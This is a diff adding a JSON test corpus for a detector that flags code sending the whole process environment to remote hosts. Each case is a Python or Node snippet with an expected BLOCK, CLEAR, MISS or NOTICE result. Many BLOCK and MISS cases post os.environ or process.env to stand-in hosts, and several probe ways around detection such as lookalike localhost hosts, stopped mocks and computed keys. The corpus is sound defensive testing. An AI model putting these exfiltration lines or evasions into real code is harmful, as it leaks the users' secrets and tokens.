@@ -1,0 +1,1082 @@
+[
+ {
+  "label": "subprocess_copy",
+  "family": "local_tools",
+  "expect": "CLEAR",
+  "text": "subprocess.run([\"make\", \"test\"], env=dict(os.environ, CI=\"1\"))"
+ },
+ {
+  "label": "subprocess_spread",
+  "family": "local_tools",
+  "expect": "CLEAR",
+  "text": "subprocess.run([\"python\", \"worker.py\"], env={**os.environ, \"MODE\": \"test\"})"
+ },
+ {
+  "label": "local_http_copy",
+  "family": "local_tools",
+  "expect": "CLEAR",
+  "text": "requests.post(\"http://127.0.0.1:8910/config\", json=dict(os.environ, MODE=\"test\"))"
+ },
+ {
+  "label": "local_http_spread",
+  "family": "local_tools",
+  "expect": "CLEAR",
+  "text": "httpx.post(\"http://localhost:8910/config\", json={**os.environ, \"MODE\": \"test\"})"
+ },
+ {
+  "label": "local_http_filtered",
+  "family": "local_tools",
+  "expect": "CLEAR",
+  "text": "requests.post(\"http://localhost:8910/config\", json={k:v for k,v in os.environ.items() if k.startswith(\"PUBLIC_\")})"
+ },
+ {
+  "label": "local_node_filtered",
+  "family": "local_tools",
+  "expect": "CLEAR",
+  "text": "fetch(\"http://127.0.0.1:8910/config\", {method:\"POST\", body:JSON.stringify(Object.fromEntries(Object.entries(process.env).filter(([k])=>k.startsWith(\"PUBLIC_\"))))})"
+ },
+ {
+  "label": "mock_patch_context",
+  "family": "mock_clients",
+  "expect": "CLEAR",
+  "text": "with patch(\"requests.post\") as mocked:\n    requests.post(\"https://example.invalid/test\", json=dict(os.environ))\n    mocked.assert_called_once()"
+ },
+ {
+  "label": "mock_assignment",
+  "family": "mock_clients",
+  "expect": "CLEAR",
+  "text": "requests.post = Mock(return_value=Response())\nrequests.post(\"https://example.invalid/test\", json=os.environ.copy())"
+ },
+ {
+  "label": "mock_session",
+  "family": "mock_clients",
+  "expect": "MISS",
+  "text": "session = MagicMock()\nsession.post(\"https://example.invalid/test\", json=os.environ)"
+ },
+ {
+  "label": "mock_client",
+  "family": "mock_clients",
+  "expect": "MISS",
+  "text": "client = Mock()\nclient.put(\"https://example.invalid/test\", json={**os.environ})"
+ },
+ {
+  "label": "mock_axios",
+  "family": "mock_clients",
+  "expect": "CLEAR",
+  "text": "jest.spyOn(axios, \"post\").mockResolvedValue({data: \"ok\"});\naxios.post(\"https://example.invalid/test\", process.env)"
+ },
+ {
+  "label": "mock_fetch",
+  "family": "mock_clients",
+  "expect": "CLEAR",
+  "text": "global.fetch = jest.fn();\nfetch(\"https://example.invalid/test\", {body:JSON.stringify(process.env)})"
+ },
+ {
+  "label": "config_copy",
+  "family": "config_loaders",
+  "expect": "CLEAR",
+  "text": "config = dict(os.environ, MODE=\"dev\")\nvalidate_config(config)"
+ },
+ {
+  "label": "config_spread",
+  "family": "config_loaders",
+  "expect": "CLEAR",
+  "text": "config = {**os.environ, \"MODE\": \"dev\"}\nload_config(config)"
+ },
+ {
+  "label": "config_default",
+  "family": "config_loaders",
+  "expect": "CLEAR",
+  "text": "requests.post(url, json={\"mode\": os.environ.get(\"MODE\", \"dev\")})"
+ },
+ {
+  "label": "config_detached_same_line",
+  "family": "config_loaders",
+  "expect": "CLEAR",
+  "text": "requests.post(url, json={\"ready\": True}); config = dict(os.environ)"
+ },
+ {
+  "label": "config_trailing_comment",
+  "family": "config_loaders",
+  "expect": "CLEAR",
+  "text": "requests.post(url, json={\"ready\": True}) # configuration is refreshed below\nconfig = dict(os.environ)"
+ },
+ {
+  "label": "config_tuple_after_close",
+  "family": "config_loaders",
+  "expect": "CLEAR",
+  "text": "result, config = requests.post(url, json={\"ready\": True}), dict(os.environ)"
+ },
+ {
+  "label": "docs_warning_python",
+  "family": "documentation",
+  "expect": "NOTICE",
+  "text": "Security guide: never send the entire process environment to an external service. The following is an unsafe example to recognize, not execute:\n```python\nrequests.post(\"https://example.invalid/test\", json=dict(os.environ))\n```\nUse a small explicit allowlist instead."
+ },
+ {
+  "label": "docs_warning_node",
+  "family": "documentation",
+  "expect": "NOTICE",
+  "text": "Security guide: the following unsafe example is shown only for review. Do not execute it.\n```js\naxios.post(\"https://example.invalid/test\", process.env)\n```\nPrefer selecting public fields explicitly."
+ },
+ {
+  "label": "docs_nonexecuting_comment",
+  "family": "documentation",
+  "expect": "CLEAR",
+  "text": "# Example of unsafe code, never run:\n# requests.post(\"https://example.invalid/test\", json=os.environ.copy())"
+ },
+ {
+  "label": "docs_local_example",
+  "family": "documentation",
+  "expect": "CLEAR",
+  "text": "Local development service configuration example:\n```python\nrequests.post(\"http://localhost:8910/config\", json=dict(os.environ, MODE=\"dev\"))\n```"
+ },
+ {
+  "label": "docs_filtered_example",
+  "family": "documentation",
+  "expect": "CLEAR",
+  "text": "Send only public configuration fields:\n```python\nrequests.post(url, json={k:v for k,v in os.environ.items() if k in {\"BUILD_NUMBER\", \"CI\"}})\n```"
+ },
+ {
+  "label": "ci_python_index",
+  "family": "ci_named_fields",
+  "expect": "CLEAR",
+  "text": "requests.post(url, json={\"build\":os.environ[\"BUILD_NUMBER\"], \"ci\":os.environ[\"CI\"]})"
+ },
+ {
+  "label": "ci_python_get",
+  "family": "ci_named_fields",
+  "expect": "CLEAR",
+  "text": "httpx.post(url, json={\"build\":os.environ.get(\"BUILD_NUMBER\")})"
+ },
+ {
+  "label": "ci_python_comprehension",
+  "family": "ci_named_fields",
+  "expect": "CLEAR",
+  "text": "requests.post(url, json={k: os.environ[k] for k in [\"BUILD_NUMBER\", \"CI\"]})"
+ },
+ {
+  "label": "ci_python_allowlist",
+  "family": "ci_named_fields",
+  "expect": "CLEAR",
+  "text": "requests.post(url, json={k:v for k,v in os.environ.items() if k in {\"BUILD_NUMBER\", \"CI\"}})"
+ },
+ {
+  "label": "ci_node_named",
+  "family": "ci_named_fields",
+  "expect": "CLEAR",
+  "text": "axios.post(url, {build:process.env.BUILD_NUMBER, ci:process.env[\"CI\"]})"
+ },
+ {
+  "label": "ci_node_allowlist",
+  "family": "ci_named_fields",
+  "expect": "CLEAR",
+  "text": "axios.post(url, Object.fromEntries(Object.entries(process.env).filter(([k])=>[\"BUILD_NUMBER\",\"CI\"].includes(k))))"
+ },
+ {
+  "label": "session_named",
+  "family": "boundary",
+  "expect": "MISS",
+  "text": "session.post(url, json=dict(os.environ))"
+ },
+ {
+  "label": "session_other_name",
+  "family": "boundary",
+  "expect": "MISS",
+  "text": "s.post(url, json=dict(os.environ))"
+ },
+ {
+  "label": "session_constructed",
+  "family": "boundary",
+  "expect": "BLOCK",
+  "text": "requests.Session().post(url, json=dict(os.environ))"
+ },
+ {
+  "label": "client_named",
+  "family": "boundary",
+  "expect": "MISS",
+  "text": "client.post(url, json=dict(os.environ))"
+ },
+ {
+  "label": "client_constructed",
+  "family": "boundary",
+  "expect": "BLOCK",
+  "text": "httpx.Client().post(url, json=dict(os.environ))"
+ },
+ {
+  "label": "pool_manager",
+  "family": "boundary",
+  "expect": "BLOCK",
+  "text": "urllib3.PoolManager().request(\"POST\", url, body=json.dumps(dict(os.environ)))"
+ },
+ {
+  "label": "pool_named",
+  "family": "boundary",
+  "expect": "MISS",
+  "text": "pool.request(\"POST\", url, body=json.dumps(dict(os.environ)))"
+ },
+ {
+  "label": "lowlevel_named",
+  "family": "boundary",
+  "expect": "MISS",
+  "text": "conn.request(\"POST\", \"/collect\", body=json.dumps(dict(os.environ)))"
+ },
+ {
+  "label": "keyword_params",
+  "family": "boundary",
+  "expect": "BLOCK",
+  "text": "requests.post(url=url, params=dict(os.environ))"
+ },
+ {
+  "label": "keyword_data",
+  "family": "boundary",
+  "expect": "BLOCK",
+  "text": "requests.request(method=\"POST\", url=url, data=dict(os.environ))"
+ },
+ {
+  "label": "async_session",
+  "family": "boundary",
+  "expect": "MISS",
+  "text": "async with session.post(url, json=dict(os.environ)) as response:\n    await response.read()"
+ },
+ {
+  "label": "async_other_name",
+  "family": "boundary",
+  "expect": "MISS",
+  "text": "async with s.post(url, json=dict(os.environ)) as response:\n    await response.read()"
+ },
+ {
+  "label": "separate_next_line",
+  "family": "boundary",
+  "expect": "CLEAR",
+  "text": "requests.post(url, json=payload)\nconfig = dict(os.environ)"
+ },
+ {
+  "label": "inner_close_before_environment",
+  "family": "boundary",
+  "expect": "BLOCK",
+  "text": "requests.post(\n    normalize_url(url)\n    , json=dict(os.environ)\n)"
+ },
+ {
+  "label": "inner_close_comma",
+  "family": "boundary",
+  "expect": "BLOCK",
+  "text": "requests.post(\n    normalize_url(url),\n    json=dict(os.environ)\n)"
+ },
+ {
+  "label": "next_line_with_comment",
+  "family": "boundary",
+  "expect": "CLEAR",
+  "text": "requests.post(url, json=payload) # completed\nconfig = dict(os.environ)"
+ },
+ {
+  "label": "same_line_after_close",
+  "family": "boundary",
+  "expect": "CLEAR",
+  "text": "requests.post(url, json=payload), dict(os.environ)"
+ },
+ {
+  "label": "window_inside",
+  "family": "boundary",
+  "expect": "BLOCK",
+  "text": "requests.post(url, headers={\"Note\":\"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\"}, json=dict(os.environ))"
+ },
+ {
+  "label": "window_outside",
+  "family": "boundary",
+  "expect": "BLOCK",
+  "text": "requests.post(url, headers={\"Note\":\"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\"}, json=dict(os.environ))"
+ },
+ {
+  "label": "py_filter_space",
+  "family": "Python selections",
+  "expect": "CLEAR",
+  "text": "requests.post(\"https://collector.example.invalid/config\", json=dict(filter (lambda kv: kv[0] == \"PUBLIC_MODE\", os.environ.items())))"
+ },
+ {
+  "label": "py_comp_multispace",
+  "family": "Python selections",
+  "expect": "CLEAR",
+  "text": "requests.post(\"https://collector.example.invalid/config\", json={k:v for k,v in  os.environ.items() if k == \"PUBLIC_MODE\"})"
+ },
+ {
+  "label": "py_comp_newline",
+  "family": "Python selections",
+  "expect": "CLEAR",
+  "text": "requests.post(\"https://collector.example.invalid/config\", json={k:v for k,v in\n os.environ.items() if k == \"PUBLIC_MODE\"})"
+ },
+ {
+  "label": "py_list_allowed",
+  "family": "Python selections",
+  "expect": "CLEAR",
+  "text": "requests.post(\"https://collector.example.invalid/config\", json=dict((k,v) for k,v in os.environ.items() if k in (\"PUBLIC_MODE\",)))"
+ },
+ {
+  "label": "node_entries_space",
+  "family": "Node selections",
+  "expect": "CLEAR",
+  "text": "axios.post(\"https://collector.example.invalid/config\", Object.fromEntries(Object.entries(process.env ).filter(([k]) => k === \"PUBLIC_MODE\")))"
+ },
+ {
+  "label": "node_entries_newline",
+  "family": "Node selections",
+  "expect": "CLEAR",
+  "text": "axios.post(\"https://collector.example.invalid/config\", Object.fromEntries(Object.entries(process.env\n).filter(([k]) => k === \"PUBLIC_MODE\")))"
+ },
+ {
+  "label": "node_pick_space",
+  "family": "Node selections",
+  "expect": "CLEAR",
+  "text": "axios.post(\"https://collector.example.invalid/config\", pick (process.env, [\"PUBLIC_MODE\"]))"
+ },
+ {
+  "label": "node_filter_comment",
+  "family": "Node selections",
+  "expect": "CLEAR",
+  "text": "axios.post(\"https://collector.example.invalid/config\", Object.fromEntries(Object.entries(process.env) /* select */ .filter(([k]) => k === \"PUBLIC_MODE\")))"
+ },
+ {
+  "label": "local_newline",
+  "family": "Local formatting",
+  "expect": "CLEAR",
+  "text": "requests.post(\n \"http://localhost:8080/config\", json=dict(os.environ))"
+ },
+ {
+  "label": "local_keyword",
+  "family": "Local formatting",
+  "expect": "CLEAR",
+  "text": "requests.post(url=\"http://localhost:8080/config\", json=dict(os.environ))"
+ },
+ {
+  "label": "local_node_newline",
+  "family": "Local formatting",
+  "expect": "CLEAR",
+  "text": "axios.post(\n \"http://127.0.0.1:8080/config\", process.env)"
+ },
+ {
+  "label": "local_uppercase",
+  "family": "Local formatting",
+  "expect": "CLEAR",
+  "text": "requests.post(\"http://LOCALHOST:8080/config\", json=dict(os.environ))"
+ },
+ {
+  "label": "py_comment_closed",
+  "family": "Boundary benign",
+  "expect": "CLEAR",
+  "text": "requests.post(\"https://collector.example.invalid/config\", json={}) # (\nconfig = os.environ.copy()"
+ },
+ {
+  "label": "py_comment_env",
+  "family": "Boundary benign",
+  "expect": "CLEAR",
+  "text": "requests.post(\"https://collector.example.invalid/config\", json={}, # os.environ is not included\n timeout=5)"
+ },
+ {
+  "label": "node_comment_env",
+  "family": "Boundary benign",
+  "expect": "CLEAR",
+  "text": "axios.post(\"https://collector.example.invalid/config\", {} /* process.env is not included */)"
+ },
+ {
+  "label": "py_fstring_display",
+  "family": "Boundary benign",
+  "expect": "CLEAR",
+  "text": "example = f'requests.post(\"https://collector.example.invalid/config\", json=dict(os.environ))'"
+ },
+ {
+  "label": "name_suffix",
+  "family": "Filter naming",
+  "expect": "BLOCK",
+  "text": "def unfilter(x): return x\nrequests.post(\"https://collector.example.invalid/config\", json=unfilter(dict(os.environ)))"
+ },
+ {
+  "label": "selection_identity",
+  "family": "Filter naming",
+  "expect": "CLEAR",
+  "text": "requests.post(\"https://collector.example.invalid/config\", json={k:v for k,v in os.environ.items() if True})"
+ },
+ {
+  "label": "comment_quote",
+  "family": "Boundary positive",
+  "expect": "BLOCK",
+  "text": "requests.post(\"https://collector.example.invalid/config\", # \"\n json=dict(os.environ))"
+ },
+ {
+  "label": "comment_close",
+  "family": "Boundary positive",
+  "expect": "BLOCK",
+  "text": "requests.post(\"https://collector.example.invalid/config\", # )\n json=dict(os.environ))"
+ },
+ {
+  "label": "fstring_host",
+  "family": "Local target",
+  "expect": "BLOCK",
+  "text": "requests.post(f\"http://localhost{suffix}/config\", json=dict(os.environ))"
+ },
+ {
+  "label": "p436_requests_dict_environ",
+  "family": "from_436_positive",
+  "expect": "BLOCK",
+  "text": "import os, requests\nrequests.post(\"https://example.invalid/x\", data=dict(os.environ))"
+ },
+ {
+  "label": "p436_httpx_json_environ",
+  "family": "from_436_positive",
+  "expect": "BLOCK",
+  "text": "import os, httpx\nhttpx.post(\"https://example.invalid/x\", json=dict(os.environ))"
+ },
+ {
+  "label": "p436_requests_unpack_environ",
+  "family": "from_436_positive",
+  "expect": "BLOCK",
+  "text": "requests.post(\"https://example.invalid/x\", data={**os.environ})"
+ },
+ {
+  "label": "p436_requests_dumps_environ",
+  "family": "from_436_positive",
+  "expect": "BLOCK",
+  "text": "requests.post(\"https://example.invalid/x\", data=json.dumps(dict(os.environ)))"
+ },
+ {
+  "label": "p436_requests_put_copy",
+  "family": "from_436_positive",
+  "expect": "BLOCK",
+  "text": "requests.put(\"https://example.invalid/x\", json=os.environ.copy())"
+ },
+ {
+  "label": "p436_session_post_bare_environ",
+  "family": "from_436_positive",
+  "expect": "MISS",
+  "text": "session.post(\"https://example.invalid/x\", json=os.environ)"
+ },
+ {
+  "label": "p436_urlopen_environ",
+  "family": "from_436_positive",
+  "expect": "BLOCK",
+  "text": "urllib.request.urlopen(urllib.request.Request(\"https://example.invalid/x\", data=json.dumps(dict(os.environ)).encode()))"
+ },
+ {
+  "label": "p436_multiline_call",
+  "family": "from_436_positive",
+  "expect": "BLOCK",
+  "text": "requests.post(\n    \"https://example.invalid/x\",\n    json=dict(\n        os.environ\n    ),\n)"
+ },
+ {
+  "label": "p436_node_fetch_stringify",
+  "family": "from_436_positive",
+  "expect": "BLOCK",
+  "text": "fetch('https://example.invalid/x', {method: 'POST', body: JSON.stringify(process.env)})"
+ },
+ {
+  "label": "p436_node_axios_post",
+  "family": "from_436_positive",
+  "expect": "BLOCK",
+  "text": "axios.post('https://example.invalid/x', process.env)"
+ },
+ {
+  "label": "p436_node_fetch_spread",
+  "family": "from_436_positive",
+  "expect": "BLOCK",
+  "text": "fetch('https://example.invalid/x', {method: 'POST', body: JSON.stringify({...process.env})})"
+ },
+ {
+  "label": "p436_bracket_in_string_before_environment",
+  "family": "from_436_positive",
+  "expect": "BLOCK",
+  "text": "requests.post(url, headers={\"X\": \")\"}, json=dict(os.environ))"
+ },
+ {
+  "label": "p436_long_header_before_environment",
+  "family": "from_436_positive",
+  "expect": "BLOCK",
+  "text": "requests.post(url, headers={\"Note\": \"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\"}, json=dict(os.environ))"
+ },
+ {
+  "label": "p436_copy_with_extra_keys_remote",
+  "family": "from_436_positive",
+  "expect": "BLOCK",
+  "text": "requests.post(\"https://example.invalid/x\", json=dict(os.environ, MODE=\"test\"))"
+ },
+ {
+  "label": "p436_spread_with_extra_keys_remote",
+  "family": "from_436_positive",
+  "expect": "BLOCK",
+  "text": "httpx.post(\"https://example.invalid/x\", json={**os.environ, \"MODE\": \"test\"})"
+ },
+ {
+  "label": "p436_local_lookalike_host",
+  "family": "from_436_positive",
+  "expect": "BLOCK",
+  "text": "requests.post(\"http://localhost.example.invalid/x\", json=dict(os.environ))"
+ },
+ {
+  "label": "p436_local_userinfo_host",
+  "family": "from_436_positive",
+  "expect": "BLOCK",
+  "text": "requests.post(\"http://127.0.0.1:80@example.invalid/x\", json=dict(os.environ))"
+ },
+ {
+  "label": "p436_environment_chosen_by_condition",
+  "family": "from_436_positive",
+  "expect": "BLOCK",
+  "text": "requests.post(\"https://example.invalid/x\", json=os.environ if debug else {})"
+ },
+ {
+  "label": "p436_node_entries_unfiltered",
+  "family": "from_436_positive",
+  "expect": "BLOCK",
+  "text": "fetch('https://example.invalid/x', {method: 'POST', body: JSON.stringify(Object.fromEntries(Object.entries(process.env)))})"
+ },
+ {
+  "label": "c436_header_one_variable",
+  "family": "from_436_clear",
+  "expect": "CLEAR",
+  "text": "requests.post(\"https://example.invalid/x\", headers={\"Authorization\": \"Bearer \" + os.environ[\"API_TOKEN\"]}, json={\"a\": 1})"
+ },
+ {
+  "label": "c436_get_one_variable",
+  "family": "from_436_clear",
+  "expect": "CLEAR",
+  "text": "requests.post(\"https://example.invalid/x\", json={\"home\": os.environ.get(\"HOME\")})"
+ },
+ {
+  "label": "c436_subprocess_env",
+  "family": "from_436_clear",
+  "expect": "CLEAR",
+  "text": "subprocess.run([\"make\"], env=dict(os.environ, CI=\"1\"))"
+ },
+ {
+  "label": "c436_get_request",
+  "family": "from_436_clear",
+  "expect": "CLEAR",
+  "text": "import os, requests\nenv = dict(os.environ)\nrequests.get(\"https://example.invalid/x\")"
+ },
+ {
+  "label": "c436_environ_after_call_ends",
+  "family": "from_436_clear",
+  "expect": "CLEAR",
+  "text": "requests.post(\"https://example.invalid/x\", json=payload)\nprint(os.environ)"
+ },
+ {
+  "label": "c436_print_environ",
+  "family": "from_436_clear",
+  "expect": "CLEAR",
+  "text": "import os\nprint(dict(os.environ))"
+ },
+ {
+  "label": "c436_node_header_one_variable",
+  "family": "from_436_clear",
+  "expect": "CLEAR",
+  "text": "fetch('https://example.invalid/x', {headers: {Authorization: `Bearer ${process.env.TOKEN}`}})"
+ },
+ {
+  "label": "c436_node_log_env",
+  "family": "from_436_clear",
+  "expect": "CLEAR",
+  "text": "console.log(process.env.NODE_ENV)"
+ },
+ {
+  "label": "c436_node_index_env",
+  "family": "from_436_clear",
+  "expect": "CLEAR",
+  "text": "axios.post('https://example.invalid/x', {mode: process.env['MODE']})"
+ },
+ {
+  "label": "c436_local_machine_node",
+  "family": "from_436_clear",
+  "expect": "CLEAR",
+  "text": "fetch('http://localhost:3000/config', {method: 'POST', body: JSON.stringify(process.env)})"
+ },
+ {
+  "label": "c436_filtered_comprehension",
+  "family": "from_436_clear",
+  "expect": "CLEAR",
+  "text": "requests.post(\"https://example.invalid/x\", json={k: v for k, v in os.environ.items() if k.startswith(\"PUBLIC_\")})"
+ },
+ {
+  "label": "c436_filtered_key_list",
+  "family": "from_436_clear",
+  "expect": "CLEAR",
+  "text": "requests.post(\"https://example.invalid/x\", json=[k for k in os.environ if k.startswith(\"PUBLIC_\")])"
+ },
+ {
+  "label": "c436_filtered_builtin",
+  "family": "from_436_clear",
+  "expect": "CLEAR",
+  "text": "requests.post(\"https://example.invalid/x\", json=dict(filter(lambda kv: kv[0] in PUBLIC, os.environ.items())))"
+ },
+ {
+  "label": "c436_node_filtered",
+  "family": "from_436_clear",
+  "expect": "CLEAR",
+  "text": "axios.post(url, Object.fromEntries(Object.entries(process.env).filter(([k]) => k.startsWith('PUBLIC_'))))"
+ },
+ {
+  "label": "c436_node_keys_projected",
+  "family": "from_436_clear",
+  "expect": "CLEAR",
+  "text": "axios.post(url, Object.keys(process.env).map((k) => k.toLowerCase()))"
+ },
+ {
+  "label": "c436_comment_after_closed_call",
+  "family": "from_436_clear",
+  "expect": "CLEAR",
+  "text": "requests.post(url, json={'ready': True}) # configuration is refreshed below\nconfig = dict(os.environ)"
+ },
+ {
+  "label": "c436_tuple_after_closed_call",
+  "family": "from_436_clear",
+  "expect": "CLEAR",
+  "text": "result, config = requests.post(url, json={'ready': True}), dict(os.environ)"
+ },
+ {
+  "label": "r2_mock_stopped",
+  "family": "review_round_2",
+  "expect": "BLOCK",
+  "text": "p = patch(\"requests.post\")\np.start()\np.stop()\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "label": "r2_mock_stopall",
+  "family": "review_round_2",
+  "expect": "BLOCK",
+  "text": "patch(\"requests.post\").start()\npatch.stopall()\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "label": "r2_mock_other_function",
+  "family": "review_round_2",
+  "expect": "BLOCK",
+  "text": "def unused():\n    patch(\"requests.post\").start()\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "label": "r2_mock_bound_other_function",
+  "family": "review_round_2",
+  "expect": "BLOCK",
+  "text": "p = patch(\"requests.post\")\ndef unused():\n    p.start()\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "label": "r2_mock_multiline_with",
+  "family": "review_round_2",
+  "expect": "CLEAR",
+  "text": "with (\n    patch(\"requests.post\")\n):\n    requests.post(destination, json=os.environ)"
+ },
+ {
+  "label": "r2_floor_div_multiline",
+  "family": "review_round_2",
+  "expect": "BLOCK",
+  "text": "n = (8\n // 2); requests.post(destination, json=os.environ)"
+ },
+ {
+  "label": "r2_inline_js_comment",
+  "family": "review_round_2",
+  "expect": "CLEAR",
+  "text": "let n = 1; // axios.post(destination, process.env)"
+ },
+ {
+  "label": "r2_regex_throw",
+  "family": "review_round_2",
+  "expect": "CLEAR",
+  "text": "function f() { throw /axios.post(destination, process.env)/; }"
+ },
+ {
+  "label": "r2_regex_after_if",
+  "family": "review_round_2",
+  "expect": "CLEAR",
+  "text": "if (true) /axios.post(destination, process.env)/.test(\"x\");"
+ },
+ {
+  "label": "r2_regex_after_while",
+  "family": "review_round_2",
+  "expect": "CLEAR",
+  "text": "while (false) /axios.post(destination, process.env)/.test(\"x\");"
+ },
+ {
+  "label": "r2_projection_nested_pairs",
+  "family": "review_round_2",
+  "expect": "BLOCK",
+  "text": "requests.post(destination, json=[key for key, value in [(v, k) for k, v in os.environ.items()]])"
+ },
+ {
+  "label": "r2_projection_dict_body",
+  "family": "review_round_2",
+  "expect": "BLOCK",
+  "text": "requests.post(destination, json={k: os.environ for k in [\"a\"]})"
+ },
+ {
+  "label": "r2_projection_list_body",
+  "family": "review_round_2",
+  "expect": "BLOCK",
+  "text": "requests.post(destination, json=[os.environ for k in [1]])"
+ },
+ {
+  "label": "r2_fetch_json_unused",
+  "family": "review_round_2",
+  "expect": "CLEAR",
+  "text": "fetch(destination, {json: process.env})"
+ },
+ {
+  "label": "r2_fetch_params_unused",
+  "family": "review_round_2",
+  "expect": "CLEAR",
+  "text": "fetch(destination, {params: process.env})"
+ },
+ {
+  "label": "r2_axios_body_unused",
+  "family": "review_round_2",
+  "expect": "CLEAR",
+  "text": "axios({url: destination, body: process.env})"
+ },
+ {
+  "label": "r2_fetch_url_contract",
+  "family": "review_round_2",
+  "expect": "BLOCK",
+  "text": "fetch(destination, {url: JSON.stringify(process.env)})"
+ },
+ {
+  "label": "r2_got_url_contract",
+  "family": "review_round_2",
+  "expect": "BLOCK",
+  "text": "got(destination, {url: JSON.stringify(process.env)})"
+ },
+ {
+  "label": "r2_fetch_computed_body",
+  "family": "review_round_2",
+  "expect": "BLOCK",
+  "text": "fetch(destination, {[\"body\"]: JSON.stringify(process.env)})"
+ },
+ {
+  "label": "r2_namespace_double_global",
+  "family": "review_round_2",
+  "expect": "CLEAR",
+  "text": "fetch(destination, {body: JSON.stringify(other.globalThis.process.env)})"
+ },
+ {
+  "label": "r2_namespace_paren",
+  "family": "review_round_2",
+  "expect": "CLEAR",
+  "text": "requests.post(destination, json=(other).os.environ)"
+ },
+ {
+  "label": "r2_namespace_gap_env",
+  "family": "review_round_2",
+  "expect": "CLEAR",
+  "text": "requests.post(destination, json=other. os.environ)"
+ },
+ {
+  "label": "r2_local_config_overridden",
+  "family": "review_round_2",
+  "expect": "BLOCK",
+  "text": "axios({url: \"http://localhost\", ...{url: \"https://example.invalid\"}, data: process.env})"
+ },
+ {
+  "label": "r2_pinned_requests_gap",
+  "family": "review_round_2",
+  "expect": "MISS",
+  "text": "requests . post(destination, json=os.environ)"
+ },
+ {
+  "label": "r2_mock_started_not_stopped",
+  "family": "review_round_2",
+  "expect": "CLEAR",
+  "text": "p = patch(\"requests.post\")\np.start()\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "label": "r2_mock_stop_of_another_patch",
+  "family": "review_round_2",
+  "expect": "CLEAR",
+  "text": "p = patch(\"requests.post\")\nq = patch(\"requests.get\")\np.start()\nq.stop()\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "label": "r2_mock_call_between_start_and_stop",
+  "family": "review_round_2",
+  "expect": "CLEAR",
+  "text": "p = patch(\"requests.post\")\np.start()\nrequests.post(destination, json=os.environ)\np.stop()"
+ },
+ {
+  "label": "r2_mock_call_after_stop_of_same_variable",
+  "family": "review_round_2",
+  "expect": "BLOCK",
+  "text": "p = patch(\"requests.post\")\np.start()\np.stop()\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "label": "r2_mock_stopall_after_direct_start",
+  "family": "review_round_2",
+  "expect": "BLOCK",
+  "text": "patch(\"requests.post\").start()\npatch.stopall()\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "label": "r2_mock_stopall_after_the_call",
+  "family": "review_round_2",
+  "expect": "CLEAR",
+  "text": "patch(\"requests.post\").start()\nrequests.post(destination, json=os.environ)\npatch.stopall()"
+ },
+ {
+  "label": "r2_mock_started_and_called_in_one_function",
+  "family": "review_round_2",
+  "expect": "CLEAR",
+  "text": "def test():\n    patch(\"requests.post\").start()\n    requests.post(destination, json=os.environ)\n"
+ },
+ {
+  "label": "r2_mock_started_in_function_called_after_it",
+  "family": "review_round_2",
+  "expect": "BLOCK",
+  "text": "def setup():\n    patch(\"requests.post\").start()\n\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "label": "r2_mock_started_at_top_level_holds_in_later_function",
+  "family": "review_round_2",
+  "expect": "CLEAR",
+  "text": "patch(\"requests.post\").start()\ndef test():\n    requests.post(destination, json=os.environ)\n"
+ },
+ {
+  "label": "r2_mock_multiline_with_two_items",
+  "family": "review_round_2",
+  "expect": "CLEAR",
+  "text": "with (\n    open(\"f\") as g,\n    patch(\"requests.post\") as m,\n):\n    requests.post(destination, json=os.environ)\n"
+ },
+ {
+  "label": "r2_mock_multiline_with_call_after_block",
+  "family": "review_round_2",
+  "expect": "BLOCK",
+  "text": "with (\n    patch(\"requests.post\")\n):\n    pass\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "label": "r2_mock_with_header_on_one_line_then_call_after",
+  "family": "review_round_2",
+  "expect": "BLOCK",
+  "text": "with patch(\"requests.post\"):\n    pass\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "label": "r2_mock_decorated_function_holds_its_body",
+  "family": "review_round_2",
+  "expect": "CLEAR",
+  "text": "@patch(\"requests.post\")\ndef test(m):\n    requests.post(destination, json=os.environ)\n"
+ },
+ {
+  "label": "r2_mock_decorator_then_call_in_other_function",
+  "family": "review_round_2",
+  "expect": "BLOCK",
+  "text": "@patch(\"requests.post\")\ndef a(m):\n    pass\n\ndef b():\n    requests.post(destination, json=os.environ)\n"
+ },
+ {
+  "label": "r2_mock_decorator_with_no_function",
+  "family": "review_round_2",
+  "expect": "BLOCK",
+  "text": "@patch(\"requests.post\")\nrequests.post(destination, json=os.environ)"
+ },
+ {
+  "label": "r2_lexical_floor_division_on_one_line",
